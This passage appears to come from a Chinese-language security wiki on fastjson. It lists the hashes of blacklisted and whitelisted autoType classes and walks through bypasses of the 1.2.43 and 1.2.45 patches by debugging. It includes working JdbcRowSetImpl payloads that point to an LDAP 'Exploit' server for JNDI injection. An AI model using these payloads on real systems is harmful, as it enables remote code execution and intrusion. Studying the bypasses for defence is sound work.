d><td>org.javasimon.</td></tr><tr><td>1.2.67</td><td>5474268165959054640L</td><td>0x4bf881e49d37f530L</td><td>org.apache.cocoon.</td></tr><tr><td>1.2.67</td><td>5596129856135573697L</td><td>0x4da972745feb30c1L</td><td>org.apache.activemq.jms.pool.</td></tr><tr><td>1.2.67</td><td>6854854816081053523L</td><td>0x5f215622fb630753L</td><td>org.mortbay.jetty.</td></tr><tr><td>1.2.68</td><td>-3077205613010077203L</td><td>0xd54b91cc77b239edL</td><td>org.apache.shiro.jndi.</td></tr><tr><td>1.2.68</td><td>-2825378362173150292L</td><td>0xd8ca3d595e982bacL</td><td>org.apache.ignite.cache.jta.</td></tr><tr><td>1.2.68</td><td>2078113382421334967L</td><td>0x1cd6f11c6a358bb7L</td><td>javax.swing.J</td></tr><tr><td>1.2.68</td><td>6007332606592876737L</td><td>0x535e552d6f9700c1L</td><td>org.aoju.bus.proxy.provider.</td></tr><tr><td>1.2.68</td><td>9140390920032557669L</td><td>0x7ed9311d28bf1a65L</td><td>java.awt.p</td></tr><tr><td>1.2.68</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.69</td><td>-8024746738719829346L</td><td>0x90a25f5baa21529eL</td><td>java.io.Serializable</td></tr><tr><td>1.2.69</td><td>-5811778396720452501L</td><td>0xaf586a571e302c6bL</td><td>java.io.Closeable</td></tr><tr><td>1.2.69</td><td>-3053747177772160511L</td><td>0xd59ee91f0b09ea01L</td><td>oracle.jms.AQ</td></tr><tr><td>1.2.69</td><td>-2114196234051346931L</td><td>0xe2a8ddba03e69e0dL</td><td>java.util.Collection</td></tr><tr><td>1.2.69</td><td>-2027296626235911549L</td><td>0xe3dd9875a2dc5283L</td><td>java.lang.Iterable</td></tr><tr><td>1.2.69</td><td>-2939497380989775398L</td><td>0xd734ceb4c3e9d1daL</td><td>java.lang.Object</td></tr><tr><td>1.2.69</td><td>-1368967840069965882L</td><td>0xed007300a7b227c6L</td><td>java.lang.AutoCloseable</td></tr><tr><td>1.2.69</td><td>2980334044947851925L</td><td>0x295c4605fd1eaa95L</td><td>java.lang.Readable</td></tr><tr><td>1.2.69</td><td>3247277300971823414L</td><td>0x2d10a5801b9d6136L</td><td>java.lang.Cloneable</td></tr><tr><td>1.2.69</td><td>5183404141909004468L</td><td>0x47ef269aadc650b4L</td><td>java.lang.Runnable</td></tr><tr><td>1.2.69</td><td>7222019943667248779L</td><td>0x6439c4dff712ae8bL</td><td>java.util.EventListener</td></tr><tr><td>1.2.70</td><td>-5076846148177416215L</td><td>0xb98b6b5396932fe9L</td><td>org.apache.commons.collections4.Transformer</td></tr><tr><td>1.2.70</td><td>-4703320437989596122L</td><td>0xbeba72fb1ccba426L</td><td>org.apache.commons.collections4.functors</td></tr><tr><td>1.2.70</td><td>-4314457471973557243L</td><td>0xc41ff7c9c87c7c05L</td><td>org.jdom2.transform.</td></tr><tr><td>1.2.70</td><td>-2533039401923731906L</td><td>0xdcd8d615a6449e3eL</td><td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td></tr><tr><td>1.2.70</td><td>156405680656087946L</td><td>0x22baa234c5bfb8aL</td><td>com.p6spy.engine.</td></tr><tr><td>1.2.70</td><td>1214780596910349029L</td><td>0x10dbc48446e0dae5L</td><td>org.apache.activemq.pool.</td></tr><tr><td>1.2.70</td><td>3085473968517218653L</td><td>0x2ad1ce3a112f015dL</td><td>org.apache.aries.transaction.</td></tr><tr><td>1.2.70</td><td>3129395579983849527L</td><td>0x2b6dd8b3229d6837L</td><td>org.apache.activemq.ActiveMQConnectionFactory</td></tr><tr><td>1.2.70</td><td>4241163808635564644L</td><td>0x3adba40367f73264L</td><td>org.apache.activemq.spring.</td></tr><tr><td>1.2.70</td><td>7240293012336844478L</td><td>0x647ab0224e149ebeL</td><td>org.apache.activemq.ActiveMQXAConnectionFactory</td></tr><tr><td>1.2.70</td><td>7347653049056829645L</td><td>0x65f81b84c1d920cdL</td><td>org.apache.commons.jelly.</td></tr><tr><td>1.2.70</td><td>7617522210483516279L</td><td>0x69b6e0175084b377L</td><td>org.apache.axis2.transport.jms.</td></tr><tr><td>1.2.71</td><td>-4537258998789938600L</td><td>0xc1086afae32e6258L</td><td>java.io.FileReader</td></tr><tr><td>1.2.71</td><td>-4150995715611818742L</td><td>0xc664b363baca050aL</td><td>java.io.ObjectInputStream</td></tr><tr><td>1.2.71</td><td>-2995060141064716555L</td><td>0xd66f68ab92e7fef5L</td><td>java.io.FileInputStream</td></tr><tr><td>1.2.71</td><td>-965955008570215305L</td><td>0xf2983d099d29b477L</td><td>java.io.ObjectOutputStream</td></tr><tr><td>1.2.71</td><td>-219577392946377768L</td><td>0xfcf3e78644b98bd8L</td><td>java.io.DataOutputStream</td></tr><tr><td>1.2.71</td><td>2622551729063269307L</td><td>x24652ce717e713bbL</td><td>java.io.PrintWriter</td></tr><tr><td>1.2.71</td><td>2930861374593775110L</td><td>0x28ac82e44e933606L</td><td>java.io.Buffered</td></tr><tr><td>1.2.71</td><td>4000049462512838776L</td><td>0x378307cb0111e878L</td><td>java.io.InputStreamReader</td></tr><tr><td>1.2.71</td><td>4193204392725694463L</td><td>0x3a31412dbb05c7ffL</td><td>java.io.OutputStreamWriter</td></tr><tr><td>1.2.71</td><td>5545425291794704408L</td><td>0x4cf54eec05e3e818L</td><td>java.io.FileWriter</td></tr><tr><td>1.2.71</td><td>6584624952928234050L</td><td>0x5b6149820275ea42L</td><td>java.io.FileOutputStream</td></tr><tr><td>1.2.71</td><td>7045245923763966215L</td><td>0x61c5bdd721385107L</td><td>java.io.DataInputStream</td></tr><tr><td>1.2.83</td><td>-8754006975464705441L</td><td>0x868385095a22725fL</td><td>org.apache.commons.io.</td></tr><tr><td>1.2.83</td><td>-8382625455832334425L</td><td>0x8baaee8f9bf77fa7L</td><td>org.mvel2.</td></tr><tr><td>1.2.83</td><td>-6088208984980396913L</td><td>0xab82562f53e6e48fL</td><td>kotlin.reflect.</td></tr><tr><td>1.2.83</td><td>-4733542790109620528L</td><td>0xbe4f13e96a6796d0L</td><td>com.googlecode.aviator.</td></tr><tr><td>1.2.83</td><td>-1363634950764737555L</td><td>0xed13653cb45c4bedL</td><td>org.aspectj.</td></tr><tr><td>1.2.83</td><td>-803541446955902575L</td><td>0xf4d93f4fb3e3d991L</td><td>org.dom4j.</td></tr><tr><td>1.2.83</td><td>860052378298585747L</td><td>0xbef8514d0b79293L</td><td>org.apache.commons.cli.</td></tr><tr><td>1.2.83</td><td>1268707909007641340L</td><td>0x119b5b1f10210afcL</td><td>com.google.common.eventbus.</td></tr><tr><td>1.2.83</td><td>3058452313624178956L</td><td>0x2a71ce2cc40a710cL</td><td>org.thymeleaf.</td></tr><tr><td>1.2.83</td><td>3740226159580918099L</td><td>0x33e7f3e02571b153L</td><td>org.junit.</td></tr><tr><td>1.2.83</td><td>3977090344859527316L</td><td>0x37317698dcfce894L</td><td>org.mockito.asm.</td></tr><tr><td>1.2.83</td><td>4319304524795015394L</td><td>0x3bf14094a524f0e2L</td><td>com.google.common.io.</td></tr><tr><td>1.2.83</td><td>5120543992130540564L</td><td>0x470fd3a18bb39414L</td><td>org.mockito.runners.</td></tr><tr><td>1.2.83</td><td>5916409771425455946L</td><td>0x521b4f573376df4aL</td><td>org.mockito.cglib.</td></tr><tr><td>1.2.83</td><td>6090377589998869205L</td><td>0x54855e265fe1dad5L</td><td>com.google.common.reflect.</td></tr><tr><td>1.2.83</td><td>7164889056054194741L</td><td>0x636ecca2a131b235L</td><td>org.mockito.stubbing.</td></tr><tr><td>1.2.83</td><td>8711531061028787095L</td><td>0x78e5935826671397L</td><td>org.apache.commons.codec.</td></tr><tr><td>1.2.83</td><td>8735538376409180149L</td><td>0x793addded7a967f5L</td><td>ognl.</td></tr><tr><td>1.2.83</td><td>8861402923078831179L</td><td>0x7afa070241b8cc4bL</td><td>com.google.common.util.concurrent.</td></tr><tr><td>1.2.83</td><td>9140416208800006522L</td><td>0x7ed9481d28bf417aL</td><td>java.awt.i</td></tr><tr><td>1.2.83</td><td>9144212112462101475L</td><td>0x7ee6c477da20bbe3L</td><td>com.google.common.net.</td></tr></tbody></table><h3 id="目前未知的列表" tabindex="-1"><a class="header-anchor" href="#目前未知的列表"><span>目前未知的列表</span></a></h3><table><thead><tr><th style="text-align:left;">version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td style="text-align:left;">1.2.42</td><td>33238344207745342</td><td>0x761619136cc13eL</td><td></td></tr><tr><td style="text-align:left;">1.2.67</td><td>-831789045734283466L</td><td>0xf474e44518f26736L</td><td></td></tr><tr><td style="text-align:left;">1.2.71</td><td>3452379460455804429L</td><td>0x2fe950d3ea52ae0dL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-8614556368991373401L</td><td>0x8872f29fd0b0b7a7L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-5472097725414717105L</td><td>0xb40f341c746ec94fL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-3750763034362895579L</td><td>0xcbf29ce484222325L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-1800035667138631116L</td><td>0xe704fd19052b2a34L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>-831789045734283466L</td><td>0xf474e44518f26736L</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>33238344207745342L</td><td>0x761619136cc13eL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>3452379460455804429L</td><td>0x2fe950d3ea52ae0dL</td><td></td></tr><tr><td style="text-align:left;">1.2.78</td><td>4215053018660518963L</td><td>0x3a7ee0635eb2bc33L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>-8614556368991373401L</td><td>0x8872f29fd0b0b7a7L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>-3750763034362895579L</td><td>0xcbf29ce484222325L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>-1800035667138631116L</td><td>0xe704fd19052b2a34L</td><td></td></tr><tr><td style="text-align:left;">1.2.83</td><td>4215053018660518963L</td><td>0x3a7ee0635eb2bc33L</td><td></td></tr></tbody></table><h3 id="内置白名单" tabindex="-1"><a class="header-anchor" href="#内置白名单"><span>内置白名单</span></a></h3><p>​<code>fastjson</code> ​在 1.2.67 开始，将内置白名单也使用哈希的方式存放。体现在这次 commit 中 <a href="https://github.com/alibaba/fastjson/commit/84eca8e56003ff6ebad3da19c6d69dcd842dbdf7" target="_blank" rel="noopener noreferrer">https://github.com/alibaba/fastjson/commit/84eca8e56003ff6ebad3da19c6d69dcd842dbdf7<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>，以下为对照表。</p><p>PS: <code>org.springframework.security.web.savedrequest.DefaultSavedRequest</code>​ 在该次 commit 中从白名单移除。</p><table><thead><tr><th>hash</th><th>name</th></tr></thead><tbody><tr><td>0xD4788669A13AE74L</td><td>java.awt.Rectangle</td></tr><tr><td>0xE08EE874A26F5EAFL</td><td>java.awt.Point</td></tr><tr><td>0xDDAAA11FECA77B5EL</td><td>java.awt.Font</td></tr><tr><td>0xB81BA299273D4E6L</td><td>java.awt.Color</td></tr><tr><td>0xA8AAA929446FFCE4L</td><td>com.alibaba.fastjson.util.AntiCollisionHashMap</td></tr><tr><td>0xD0E71A6E155603C1L</td><td>com.alipay.sofa.rpc.core.exception.SofaTimeOutException</td></tr><tr><td>0x9F2E20FB6049A371L</td><td>java.util.Collections.UnmodifiableMap</td></tr><tr><td>0xD45D6F8C9017FAL</td><td>java.util.concurrent.ConcurrentSkipListMap</td></tr><tr><td>0x64DC636F343516DCL</td><td>java.util.concurrent.ConcurrentSkipListSet</td></tr><tr><td>0x7FE2B8E675DA0CEFL</td><td>org.springframework.dao.CannotAcquireLockException</td></tr><tr><td>0xF8C7EF9B13231FB6L</td><td>org.springframework.dao.CannotSerializeTransactionException</td></tr><tr><td>0x42646E60EC7E5189L</td><td>org.springframework.dao.CleanupFailureDataAccessException</td></tr><tr><td>0xCC720543DC5E7090L</td><td>org.springframework.dao.ConcurrencyFailureException</td></tr><tr><td>0xC0FE32B8DC897DE9L</td><td>org.springframework.dao.DataAccessResourceFailureException</td></tr><tr><td>0xDC9583F0087CC2C7L</td><td>org.springframework.dao.DataIntegrityViolationException</td></tr><tr><td>0x5449EC9B0280B9EFL</td><td>org.springframework.dao.DataRetrievalFailureException</td></tr><tr><td>0xEB7D4786C473368DL</td><td>org.springframework.dao.DeadlockLoserDataAccessException</td></tr><tr><td>0x44D57A1B1EF53451L</td><td>org.springframework.dao.DuplicateKeyException</td></tr><tr><td>0xC92D8F9129AF339BL</td><td>org.springframework.dao.EmptyResultDataAccessException</td></tr><tr><td>0x9DF9341F0C76702L</td><td>org.springframework.dao.IncorrectResultSizeDataAccessException</td></tr><tr><td>0xDB7BFFC197369352L</td><td>org.springframework.dao.IncorrectUpdateSemanticsDataAccessException</td></tr><tr><td>0x73FBA1E41C4C3553L</td><td>org.springframework.dao.InvalidDataAccessApiUsageException</td></tr><tr><td>0x76566C052E83815L</td><td>org.springframework.dao.InvalidDataAccessResourceUsageException</td></tr><tr><td>0x61D10AF54471E5DEL</td><td>org.springframework.dao.NonTransientDataAccessException</td></tr><tr><td>0x82E8E13016B73F9EL</td><td>org.springframework.dao.NonTransientDataAccessResourceException</td></tr><tr><td>0xE794F5F7DCD3AC85L</td><td>org.springframework.dao.OptimisticLockingFailureException</td></tr><tr><td>0x3F64BC3933A6A2DFL</td><td>org.springframework.dao.PermissionDeniedDataAccessException</td></tr><tr><td>0x863D2DD1E82B9ED9L</td><td>org.springframework.dao.PessimisticLockingFailureException</td></tr><tr><td>0x4BB3C59964A2FC50L</td><td>org.springframework.dao.QueryTimeoutException</td></tr><tr><td>0x552D9FB02FFC9DEFL</td><td>org.springframework.dao.RecoverableDataAccessException</td></tr><tr><td>0x21082DFBF63FBCC1L</td><td>org.springframework.dao.TransientDataAccessException</td></tr><tr><td>0x178B0E2DC3AE9FE5L</td><td>org.springframework.dao.TransientDataAccessResourceException</td></tr><tr><td>0x24AE2D07FB5D7497L</td><td>org.springframework.dao.TypeMismatchDataAccessException</td></tr><tr><td>0x90003416F28ACD89L</td><td>org.springframework.dao.UncategorizedDataAccessException</td></tr><tr><td>0x73A0BE903F2BCBF4L</td><td>org.springframework.jdbc.BadSqlGrammarException</td></tr><tr><td>0x7B606F16A261E1E6L</td><td>org.springframework.jdbc.CannotGetJdbcConnectionException</td></tr><tr><td>0xAFCB539973CEA3F7L</td><td>org.springframework.jdbc.IncorrectResultSetColumnCountException</td></tr><tr><td>0x4A39C6C7ACB6AA18L</td><td>org.springframework.jdbc.InvalidResultSetAccessException</td></tr><tr><td>0x9E404E583F254FD4L</td><td>org.springframework.jdbc.JdbcUpdateAffectedIncorrectNumberOfRowsException</td></tr><tr><td>0x34CC8E52316FA0CBL</td><td>org.springframework.jdbc.LobRetrievalFailureException</td></tr><tr><td>0xB5114C70135C4538L</td><td>org.springframework.jdbc.SQLWarningException</td></tr><tr><td>0x7F36112F218143B6L</td><td>org.springframework.jdbc.UncategorizedSQLException</td></tr><tr><td>0x26C5D923AF21E2E1L</td><td>org.springframework.cache.support.NullValue</td></tr><tr><td>0xD11D2A941337A7BCL</td><td>org.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken</td></tr><tr><td>0x4F0C3688E8A18F9FL</td><td>org.springframework.security.oauth2.common.DefaultOAuth2AccessToken</td></tr><tr><td>0xC59AA84D9A94C640L</td><td>org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken</td></tr><tr><td>0x1F10A70EE4065963L</td><td>org.springframework.util.LinkedMultiValueMap</td></tr><tr><td>0x557F642131553498L</td><td>org.springframework.util.LinkedCaseInsensitiveMap</td></tr><tr><td>0x8B2081CB3A50BD44L</td><td>org.springframework.remoting.support.RemoteInvocation</td></tr><tr><td>0x8B2081CB3A50BD44L</td><td>org.springframework.remoting.support.RemoteInvocation</td></tr><tr><td>0x54DC66A59269BAE1L</td><td>org.springframework.security.web.savedrequest.SavedCookie</td></tr><tr><td>0x111D12921C5466DAL</td><td>org.springframework.security.web.csrf.DefaultCsrfToken</td></tr><tr><td>0x19DCAF4ADC37D6D4L</td><td>org.springframework.security.web.authentication.WebAuthenticationDetails</td></tr><tr><td>0x604D6657082C1EE9L</td><td>org.springframework.security.core.context.SecurityContextImpl</td></tr><tr><td>0xF4AA683928027CDAL</td><td>org.springframework.security.authentication.UsernamePasswordAuthenticationToken</td></tr><tr><td>0x92F252C398C02946L</td><td>org.springframework.security.core.authority.SimpleGrantedAuthority</td></tr><tr><td>0x6B949CE6C2FE009L</td><td>org.springframework.security.core.userdetails.User</td></tr></tbody></table><h2 id="_1-2-25-1-2-43-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-43-补丁绕过"><span>1.2.25 - 1.2.43 补丁绕过</span></a></h2><h3 id="调试分析-1" tabindex="-1"><a class="header-anchor" href="#调试分析-1"><span>调试分析</span></a></h3><p>修改 fastjson 的版本为 <code>1.2.43</code>​，运行上面的 poc 进行查看，报错 autoType is not support. LLcom.sun.rowset.JdbcRowSetImpl;; 调试看看，修改的是直接对类名以 &quot;<code>LL</code>​&quot; 开头的直接报错。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">BASIC</span> <span class="token operator">=</span> <span class="token number">0</span>xcbf29ce484222325L<span class="token punctuation">;</span>
<span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token constant">PRIME</span> <span class="token operator">=</span> <span class="token number">0</span>x100000001b3L<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419153353-tuyqjti.328e7096.png" alt="image" loading="lazy">​</p><h3 id="绕过利用-1" tabindex="-1"><a class="header-anchor" href="#绕过利用-1"><span>绕过利用</span></a></h3><p>那能不能用上面提到的 <code>[</code>​ 来进行 绕过呢？先用 <code>[</code>​ 来进行绕过试试，poc 如下。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true}&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>提示格式错误，看来还得调试一下。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>exepct <span class="token char">&#39;[&#39;</span><span class="token punctuation">,</span> but <span class="token punctuation">,</span><span class="token punctuation">,</span> pos <span class="token number">42</span><span class="token punctuation">,</span> json <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;dataSourceName&quot;</span><span class="token operator">:</span><span class="token string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;autoCommit&quot;</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功走到了 <code>com.alibaba.fastjson.util.TypeUtils#loadClass</code>​。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419155911-w98hvgg.84787d95.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419160145-yiwqf8q.28653892.png" alt="image" loading="lazy">​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419161207-8stryy3.534827d9.png" alt="image" loading="lazy">​</p><p>‍</p><p>证明类是正常加载了，返回的 <code>clazz</code>​ 如上所示，是在 <code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>​ 最后反序列的时候出错。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419161546-jk16i96.868600eb.png" alt="image" loading="lazy">​</p><p>按照错误提示进行修改，根据错误提示信息 exepct &#39;<code>[</code>​&#39;, but <code>,</code>​, pos 42，JSON 解析器期望在位置 42 处找到一个 <code>[</code>​ 符号，但是实际上找到了一个逗号 <code>,</code>​。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419162242-yjm8w2j.2c883e7a.png" alt="image" loading="lazy">​</p><p>那就按它的期望在 <code>,</code>​ 的位置添加一个 <code>[</code>​ 咯，修改运行。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true}&quot;</span><span class="token punctuation">;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>报错</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>syntax error<span class="token punctuation">,</span> expect <span class="token punctuation">{</span><span class="token punctuation">,</span> actual string<span class="token punctuation">,</span> pos <span class="token number">43</span><span class="token punctuation">,</span> fastjson<span class="token operator">-</span>version <span class="token number">1.2</span><span class="token number">.43</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>好，继续修改添加，最终 poc 如下成功绕过。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JdbcRowSetImplPoc</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">&quot;{\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[{,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true}&quot;</span><span class="token punctuation">;</span>

        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419162602-d9ilksg.50ea9f03.png" alt="image" loading="lazy">​</p><p>‍</p><p><strong>原因：</strong> 在反序列化中，调用了 <code>DefaultJSONParser.parseArray()</code>​ 函数来解析数组内容，其中会有一些 if 判断语句校验后面的字符内容是否为 &quot;<code>[</code>​&quot;、&quot;<code>{</code>​&quot; 等，前面一开始尝试的几个 payload 报错的原因正是出在这里。</p><p>​<code>com.alibaba.fastjson.parser.DefaultJSONParser.parseArray(DefaultJSONParser.java:675)</code>​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419163345-1uzf0nn.147c2b89.png" alt="image" loading="lazy">​</p><p>​<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:451)</code>​</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419163257-t8eh8zj.63606a19.png" alt="image" loading="lazy">​</p><h2 id="_1-2-25-1-2-45-补丁绕过" tabindex="-1"><a class="header-anchor" href="#_1-2-25-1-2-45-补丁绕过"><span>1.2.25 - 1.2.45 补丁绕过</span></a></h2><h3 id="调试分析-2" tabindex="-1"><a class="header-anchor" href="#调试分析-2"><span>调试分析</span></a></h3><p>修改 fastjson 的版本为 <code>1.2.45</code>​，运行上面的 poc 进行查看，报错 autoType is not support. [com.sun.rowset.JdbcRowSetImpl 调试看看。</p><p>​<img src="/SecWikiPublic/secwiki/assets/img/image-20240419164413-uxv0sz1.2ccc436f.png" alt="image" loading="lazy">​</p><h3 id="绕过利用-2" tabindex="-1"><a class="header-anchor" href="#绕过利用-2"><span>绕过利用</span></a></h3><p>​<code>1.2.45</code>​ 这个版本之后修复了之前的关于字符串处理绕过黑名单的问题，这里是利用的是不存在黑名单中的类。</p><p><strong>前提条件：</strong> 需要目标服务端存在 <a href="https://mvnrepository.com/artifact/org.mybatis/mybatis" target="_blank" rel="noopener noreferrer">mybatis<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 的 jar 包，且版本需为 <code>3.x.x</code>​ 系列 <s>​<code>&lt;3.5.0</code>​</s>​ <s>的版本</s>。（实测到截止本文最新版本 <a href="https://mvnrepository.com/artifact/org.mybatis/mybatis/3.5.16" target="_blank" rel="noopener noreferrer">3.5.16<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> 都可以触发）</p><p>添加依赖</p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token comment">&lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>mybatis<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>3.0.4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>poc 如下</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

